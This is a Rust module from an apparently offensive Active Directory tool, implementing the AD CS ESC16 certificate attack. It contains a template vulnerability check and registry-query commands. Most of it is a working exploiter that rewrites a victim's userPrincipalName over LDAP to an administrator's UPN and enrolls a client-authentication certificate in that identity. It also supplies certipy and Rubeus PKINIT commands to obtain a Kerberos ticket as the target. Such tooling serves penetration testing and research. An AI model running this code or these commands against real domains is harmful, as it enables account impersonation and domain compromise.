//! ESC16 — Machine Account Certificate + Security Extension Disablement
//!
//! ESC16 combines two conditions:
//!
//! 1. The `CT_FLAG_NO_SECURITY_EXTENSION` flag (0x00080000) is set on a
//!    certificate template's `msPKI-Certificate-Name-Flag` attribute, meaning
//!    the CA will **not** embed the requester's SID in the
//!    `szOID_NTDS_CA_SECURITY_EXT` (1.3.6.1.4.1.311.25.2) extension.
//!
//! 2. The attacker holds **GenericWrite** (or equivalent) over a victim account
//!    and can change the victim's `userPrincipalName` (UPN) to the target's UPN
//!    before enrollment — similar to ESC9 but specifically abusing the
//!    NO_SECURITY_EXTENSION behavior rather than weak mapping enforcement.
//!
//! Without the security extension, the KDC falls back to the legacy
//! `CertificateMappingMethods` or `StrongCertificateBindingEnforcement`
//! registry settings.  If those are set to compatibility mode (0 or 1), the
//! UPN in the SAN is trusted, enabling impersonation.
//!
//! **Vulnerable configuration:**
//! - `CT_FLAG_NO_SECURITY_EXTENSION` is set on the template.
//! - `StrongCertificateBindingEnforcement` is 0 or 1 (compatibility mode).
//! - The attacker has GenericWrite over a victim account (to set UPN).
//! - The victim (or attacker) can enroll in the template.
//!
//! **Attack flow:**
//! 1. Modify the victim's UPN to the target's UPN (e.g. `administrator@corp.local`).
//! 2. Enroll in the template using the victim's credentials → cert is issued
//!    with the target's UPN in the SAN but without the security SID extension.
//! 3. Restore the victim's original UPN.
//! 4. Authenticate with the cert via PKINIT → KDC maps by UPN → TGT as target.
//!
//! Reference: SpecterOps "Certified Pre-Owned" updates (2024), TrustedSec research

use crate::adcs::esc9;
use crate::adcs::pfx::create_pfx;
use crate::adcs::web_enrollment::WebEnrollmentClient;
use crate::adcs::{IssuedCertificate, create_client_auth_csr};
use crate::error::{OverthroneError, Result};
use tracing::info;

// ─────────────────────────────────────────────────────────
//  Constants
// ─────────────────────────────────────────────────────────

/// Re-export the flag from esc9 for convenience
pub use crate::adcs::esc9::CT_FLAG_NO_SECURITY_EXTENSION;

/// Registry key that controls certificate mapping enforcement
pub const STRONG_CERT_BINDING_KEY: &str =
    r"HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement";

/// Value 0 = disabled (vulnerable), 1 = compatibility mode (vulnerable), 2 = enforced
pub const STRONG_CERT_BINDING_DISABLED: u32 = 0;
pub const STRONG_CERT_BINDING_COMPAT: u32 = 1;
pub const STRONG_CERT_BINDING_ENFORCED: u32 = 2;

// ─────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────

/// A template vulnerable to ESC16
#[derive(Debug, Clone)]
pub struct Esc16VulnerableTemplate {
    /// Template common name
    pub template_name: String,
    /// Display name
    pub display_name: String,
    /// Whether CT_FLAG_NO_SECURITY_EXTENSION is set
    pub no_security_extension: bool,
    /// Whether the current user can enroll
    pub enrollable: bool,
    /// Extended Key Usages
    pub ekus: Vec<String>,
}

/// Configuration for an ESC16 attack
#[derive(Debug, Clone)]
pub struct Esc16Config {
    /// CA web enrollment URL
    pub ca_server: String,
    /// Template name (must have CT_FLAG_NO_SECURITY_EXTENSION)
    pub template: String,
    /// Target UPN to impersonate (e.g. administrator@corp.local)
    pub target_upn: String,
    /// Victim account whose UPN will be temporarily modified
    pub victim: String,
    /// Original UPN of the victim (for restoration)
    pub original_upn: String,
    /// Domain name (e.g. corp.local)
    pub domain: String,
    /// LDAP URL for UPN modification commands
    pub ldap_url: String,
}

/// Result of a completed ESC16 attack
#[derive(Debug, Clone)]
pub struct Esc16Result {
    /// The issued certificate
    pub certificate: IssuedCertificate,
    /// The impersonated UPN
    pub impersonated_upn: String,
    /// PKINIT command
    pub pkinit_command: String,
    /// Cleanup commands
    pub cleanup_commands: Vec<String>,
    /// Human-readable impact description
    pub impact_description: String,
    /// Whether live UPN poisoning was performed
    pub live_upn_modified: bool,
}

// ─────────────────────────────────────────────────────────
//  Detection helpers
// ─────────────────────────────────────────────────────────

/// Check whether a template is vulnerable to ESC16.
/// Requirements:
/// - `CT_FLAG_NO_SECURITY_EXTENSION` (0x00080000) is set on the name flag.
/// - Template allows Client Authentication or PKINIT EKU.
pub fn is_esc16_vulnerable(certificate_name_flag: u32, ekus: &[String]) -> bool {
    let has_no_sec_ext = (certificate_name_flag & esc9::CT_FLAG_NO_SECURITY_EXTENSION) != 0;

    if !has_no_sec_ext {
        return false;
    }

    ekus.iter().any(|eku| {
        eku.contains("1.3.6.1.5.5.7.3.2")             // Client Authentication
            || eku.contains("2.5.29.37.0")              // Any Purpose
            || eku.contains("1.3.6.1.4.1.311.20.2.2") // PKINIT Client Authentication
    })
}

/// Generate the registry check commands for
/// `StrongCertificateBindingEnforcement` assessment
pub fn strong_cert_binding_check_commands(dc: &str) -> Vec<String> {
    vec![
        format!(
            "# Check StrongCertificateBindingEnforcement on DC\n\
             reg query \"\\\\{}\\{}\" /v StrongCertificateBindingEnforcement 2>nul",
            dc, STRONG_CERT_BINDING_KEY
        ),
        format!(
            "# PowerShell remote:\n\
             Invoke-Command -ComputerName {} -ScriptBlock {{\n\
               Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Kdc' \\\n\
                 -Name StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue\n\
             }}",
            dc
        ),
        "# Values: 0 = disabled (VULNERABLE), 1 = compat (VULNERABLE), 2 = enforced (safe)"
            .to_string(),
    ]
}

// ─────────────────────────────────────────────────────────
//  UPN poisoning (reuses ESC9 LDAP helpers)
// ─────────────────────────────────────────────────────────

/// Generate UPN modification commands for ESC16 (guidance-only)
pub fn upn_poison_commands(
    victim: &str,
    target_upn: &str,
    original_upn: &str,
    ldap_url: &str,
) -> (String, String) {
    let set_cmd = format!(
        "# ESC16 Step 1: Modify victim UPN to target UPN\n\
         certipy account update -u attacker@domain -p 'password' \\\n\
           -user {victim} -upn {target_upn} -ldap-url {ldap_url}\n\
         # OR PowerShell:\n\
         Set-ADUser {victim} -UserPrincipalName '{target_upn}'"
    );

    let restore_cmd = format!(
        "# ESC16 CLEANUP: Restore victim's original UPN\n\
         certipy account update -u attacker@domain -p 'password' \\\n\
           -user {victim} -upn {original_upn} -ldap-url {ldap_url}\n\
         # OR PowerShell:\n\
         Set-ADUser {victim} -UserPrincipalName '{original_upn}'"
    );

    (set_cmd, restore_cmd)
}

// ─────────────────────────────────────────────────────────
//  Exploiter
// ─────────────────────────────────────────────────────────

/// ESC16 exploiter — CT_FLAG_NO_SECURITY_EXTENSION + UPN poisoning
pub struct Esc16Exploiter {
    web_client: WebEnrollmentClient,
}

impl Esc16Exploiter {
    /// Create a new ESC16 exploiter (HTTPS).
    pub fn new(ca_server: &str) -> Result<Self> {
        Self::with_ssl(ca_server, true)
    }

    /// Create a new ESC16 exploiter with explicit SSL choice.
    pub fn with_ssl(ca_server: &str, use_ssl: bool) -> Result<Self> {
        let web_client = WebEnrollmentClient::with_ssl(ca_server, use_ssl)?;
        Ok(Self { web_client })
    }

    /// Execute the ESC16 attack — guidance-only mode (does not modify LDAP).
    /// Produces the cert request assuming the UPN has already been poisoned.
    pub async fn exploit(&self, config: &Esc16Config) -> Result<Esc16Result> {
        info!(
            "ESC16: Exploiting NO_SECURITY_EXTENSION template '{}' → impersonate '{}'",
            config.template, config.target_upn
        );

        let subject_cn = format!("overthrone-esc16-{}", config.victim);
        let (csr_der, private_key) =
            create_client_auth_csr(&subject_cn, &config.template, Some(&config.target_upn))?;

        let response = self
            .web_client
            .submit_request_with_san(&csr_der, &config.template, &config.target_upn)
            .await?;

        if !response.is_issued() {
            return Err(OverthroneError::EscAttack {
                esc_number: 16,
                reason: format!("CA rejected ESC16 request: {}", response.message),
            });
        }

        let cert_data = response
            .certificate
            .ok_or_else(|| OverthroneError::Adcs("No certificate in CA response".to_string()))?;

        // Verify the certificate does NOT contain the security extension
        if crate::adcs::esc15::cert_has_security_extension(&cert_data) {
            tracing::warn!(
                "ESC16: Unexpected — the certificate DOES contain the security SID extension. \
                 The CT_FLAG_NO_SECURITY_EXTENSION flag may not have taken effect."
            );
        }

        let pfx_data =
            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());

        let (_, restore_cmd) = upn_poison_commands(
            &config.victim,
            &config.target_upn,
            &config.original_upn,
            &config.ldap_url,
        );

        let pkinit_command = format!(
            "certipy auth -pfx esc16_{victim}.pfx -dc-ip <DC_IP> -domain {domain}\n\
             # OR:\n\
             Rubeus.exe asktgt /user:{target} /certificate:esc16_{victim}.pfx \
             /domain:{domain} /nowrap",
            victim = config.victim,
            domain = config.domain,
            target = config
                .target_upn
                .split('@')
                .next()
                .unwrap_or(&config.target_upn),
        );

        let cleanup_commands = vec![
            restore_cmd.clone(),
            "# Verify UPN was restored:".to_string(),
            format!(
                "Get-ADUser {} -Properties UserPrincipalName | Select UserPrincipalName",
                config.victim
            ),
        ];

        let impact_description = format!(
            "ESC16: Template '{}' has CT_FLAG_NO_SECURITY_EXTENSION set, so the CA \
             omits the SID-bearing security extension from issued certificates. By \
             poisoning the victim's UPN to '{}' and enrolling, the resulting certificate \
             maps to '{}' on PKINIT — granting a TGT as that principal (assuming \
             StrongCertificateBindingEnforcement ≤ 1).",
            config.template, config.target_upn, config.target_upn
        );

        Ok(Esc16Result {
            certificate: IssuedCertificate {
                pfx_data,
                thumbprint: Self::compute_thumbprint(&cert_data),
                serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                valid_from: "Unknown".to_string(),
                valid_to: "Unknown".to_string(),
                template: config.template.clone(),
                subject: format!("CN={}", subject_cn),
                issuer: self.web_client.base_url(),
                public_key_algorithm: "RSA".to_string(),
                signature_algorithm: "SHA256RSA".to_string(),
                private_key_pem: private_key,
            },
            impersonated_upn: config.target_upn.clone(),
            pkinit_command,
            cleanup_commands,
            impact_description,
            live_upn_modified: false,
        })
    }

    /// Execute ESC16 with live UPN poisoning via LDAP.
    pub async fn exploit_with_ldap(
        &self,
        config: &Esc16Config,
        target_dc: &str,
        ldap_user: &str,
        ldap_pass: &str,
        victim_dn: &str,
        ldaps: bool,
    ) -> Result<Esc16Result> {
        info!(
            "ESC16: Live UPN poisoning {} → {} via LDAP",
            config.victim, config.target_upn
        );

        // Reuse ESC9's LDAP-based UPN poisoning
        let _ldap_config = esc9::Esc9Config {
            ca_server: config.ca_server.clone(),
            template: config.template.clone(),
            target_upn: config.target_upn.clone(),
            victim: config.victim.clone(),
            victim_dn: victim_dn.to_string(),
            original_upn: config.original_upn.clone(),
            ldap_url: config.ldap_url.clone(),
        };

        // Step 1: Poison the UPN
        let mut session = crate::proto::ldap::LdapSession::connect(
            target_dc,
            &config.domain,
            ldap_user,
            ldap_pass,
            ldaps,
        )
        .await
        .map_err(|e| OverthroneError::EscAttack {
            esc_number: 16,
            reason: format!("LDAP connection failed: {e}"),
        })?;

        // Read current UPN for safety check
        let current_upn = session
            .read_attribute(victim_dn, "userPrincipalName")
            .await
            .unwrap_or_default();
        info!(
            "ESC16: Current UPN for {}: {:?}",
            config.victim, current_upn
        );

        // Set victim's UPN to the target's UPN
        session
            .modify_replace(victim_dn, "userPrincipalName", config.target_upn.as_bytes())
            .await
            .map_err(|e| OverthroneError::EscAttack {
                esc_number: 16,
                reason: format!("UPN modification failed: {e}"),
            })?;

        info!(
            "ESC16: Poisoned {}'s UPN → {}",
            config.victim, config.target_upn
        );

        // Step 2: Enroll
        let mut result = self.exploit(config).await;

        // Step 3: Restore UPN (always, even on enrollment failure)
        let restore_upn = if config.original_upn.is_empty() {
            current_upn.first().cloned().unwrap_or_default()
        } else {
            config.original_upn.clone()
        };

        if !restore_upn.is_empty() {
            let _ = session
                .modify_replace(victim_dn, "userPrincipalName", restore_upn.as_bytes())
                .await;
            info!("ESC16: Restored {}'s UPN → {}", config.victim, restore_upn);
        }

        let _ = session.disconnect().await;

        if let Ok(ref mut r) = result {
            r.live_upn_modified = true;
        }

        result
    }

    fn compute_thumbprint(der: &[u8]) -> String {
        use sha1::{Digest, Sha1};
        let digest = Sha1::digest(der);
        hex::encode(digest)
    }

    fn extract_serial(der: &[u8]) -> Option<String> {
        use x509_parser::parse_x509_certificate;
        parse_x509_certificate(der)
            .ok()
            .map(|(_, c)| c.raw_serial_as_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_esc16_vulnerable_true() {
        let flag = esc9::CT_FLAG_NO_SECURITY_EXTENSION;
        assert!(is_esc16_vulnerable(
            flag,
            &["1.3.6.1.5.5.7.3.2".to_string()],
        ));
    }

    #[test]
    fn test_is_esc16_vulnerable_false_no_flag() {
        assert!(!is_esc16_vulnerable(0, &["1.3.6.1.5.5.7.3.2".to_string()],));
    }

    #[test]
    fn test_is_esc16_vulnerable_false_no_eku() {
        let flag = esc9::CT_FLAG_NO_SECURITY_EXTENSION;
        assert!(!is_esc16_vulnerable(
            flag,
            &["1.3.6.1.5.5.7.3.1".to_string()], // Server Auth only
        ));
    }

    #[test]
    fn test_upn_poison_commands() {
        let (set_cmd, restore_cmd) = upn_poison_commands(
            "alice",
            "administrator@corp.local",
            "alice@corp.local",
            "ldap://dc01.corp.local",
        );
        assert!(set_cmd.contains("alice"));
        assert!(set_cmd.contains("administrator@corp.local"));
        assert!(restore_cmd.contains("alice@corp.local"));
        assert!(restore_cmd.contains("CLEANUP"));
    }

    #[test]
    fn test_strong_cert_binding_check() {
        let commands = strong_cert_binding_check_commands("dc01.corp.local");
        assert!(!commands.is_empty());
        assert!(commands[0].contains("StrongCertificateBindingEnforcement"));
    }

    #[test]
    fn test_enforcement_constants() {
        assert_eq!(STRONG_CERT_BINDING_DISABLED, 0);
        assert_eq!(STRONG_CERT_BINDING_COMPAT, 1);
        assert_eq!(STRONG_CERT_BINDING_ENFORCED, 2);
    }
}
